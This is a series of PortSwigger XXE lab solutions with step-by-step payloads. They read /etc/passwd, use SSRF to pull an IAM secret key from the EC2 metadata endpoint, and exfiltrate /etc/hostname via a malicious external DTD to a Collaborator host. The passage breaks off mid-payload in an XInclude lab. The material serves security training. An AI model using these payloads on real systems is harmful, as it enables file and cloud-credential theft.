**Lab: Exploiting XXE using external entities to retrieve files**

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
Replace the productId number with a reference to the external entity: &xxe;. The response should contain "Invalid product ID:" followed by the contents of the /etc/passwd file.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/4b659553-dd2e-4d5c-841a-1cab3610b62a)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/a68a9acb-e875-4d12-87af-d7e5c8796230)

**Lab: Exploiting XXE to perform SSRF attacks**

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
Replace the productId number with a reference to the external entity: &xxe;. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/d38497ba-f4c7-4125-872a-63a90a358418)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b6f0cd29-de9b-41f8-9496-324addf1e1b4)

**Lab: Blind XXE with out-of-band interaction**

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
Replace the productId number with a reference to the external entity:

&xxe;
Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/8afc8214-9a2e-4d83-b374-cf2077bb0594)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/1df95350-7428-4192-b893-2aa38c5ee0d8)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/708a1c40-e077-46f2-9db4-6a5642732af1)

**Lab: Blind XXE with out-of-band interaction via XML parameter entities**

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/8df209cf-4144-4121-986f-fa9f7eb59494)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/73f1997e-a9ff-4226-ac36-6039d0a88b6a)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/94269059-7387-4362-a69f-e26947ca38a8)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/12bc1db7-bc89-4837-a888-298821baa798)

**Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD**

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

Using Burp Suite Professional, go to the Collaborator tab.
Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
Place the Burp Collaborator payload into a malicious DTD file:

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/1f4d0bee-a930-4eff-b4d9-decb8cddbd9a)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/dd67acd8-378e-4809-b56c-1e5b2f61d286)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/8bccc266-40c5-4318-a957-d4899d818712)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/a812d4f2-ec14-40c6-afa0-21df3c2bae30)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/eec5b5f6-6fa2-43d5-80a9-608676972f7c)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/55c1342e-23d2-4205-89f2-0d73c0931f2c)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/c5281175-2a58-4266-bac1-e9ba8bab0bc6)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/41731873-a46d-4ab5-abb9-0073d67d1c7c)

**Lab: Exploiting blind XXE to retrieve data via error messages**

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

Click "Go to exploit server" and save the following malicious DTD file on your server:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path.

Click "View exploit" and take a note of the URL for your malicious DTD.
You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
You should see an error message containing the contents of the /etc/passwd file.


**Lab: Exploiting XInclude to retrieve files**

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Set the value of the productId parameter to:

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" 
